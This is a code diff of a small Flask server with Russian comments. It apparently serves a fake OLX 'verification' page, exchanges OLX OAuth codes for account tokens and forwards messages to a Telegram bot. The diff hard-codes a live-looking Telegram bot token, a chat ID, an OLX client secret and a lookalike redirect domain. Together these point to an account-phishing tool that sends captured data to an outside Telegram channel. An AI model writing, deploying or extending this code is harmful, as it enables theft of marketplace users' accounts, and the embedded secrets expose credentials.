@@ -4,28 +4,31 @@ import os
 
 app = Flask(__name__)
 
-TG_TOKEN = os.environ.get("TG_TOKEN")
-TG_CHAT_ID = os.environ.get("TG_CHAT_ID")
-CLIENT_ID = os.environ.get("CLIENT_ID")
-CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
-REDIRECT_URI = os.environ.get("REDIRECT_URI")
+# ---- ПЕРЕМЕННЫЕ ----
+# Railway Environment Variables будут подставлены через os.environ
+TG_TOKEN = os.environ.get("TG_TOKEN", "8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw")
+TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "-1003455979409")
+CLIENT_ID = os.environ.get("CLIENT_ID", "202421")
+CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf")
+REDIRECT_URI = os.environ.get("REDIRECT_URI", "https://verif-olx-com-phi.vercel.app/")
 
-# теперь используем эти переменные в коде
-
+# ---- Функция отправки сообщений в Telegram ----
 def send_telegram_message(msg):
     try:
         requests.post(
-            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
-            json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"},
+            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
+            json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "HTML"},
             timeout=10
         )
     except Exception as e:
         print("Telegram error:", e)
 
+# ---- Главная страница ----
 @app.route('/')
 def index():
     return send_from_directory('.', 'index.html')
 
+# ---- Получение токена OLX через OAuth ----
 @app.route('/get_token', methods=['POST'])
 def get_token():
     data = request.get_json(silent=True) or {}
@@ -59,6 +62,7 @@ def get_token():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
+# ---- Запуск сервера ----
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
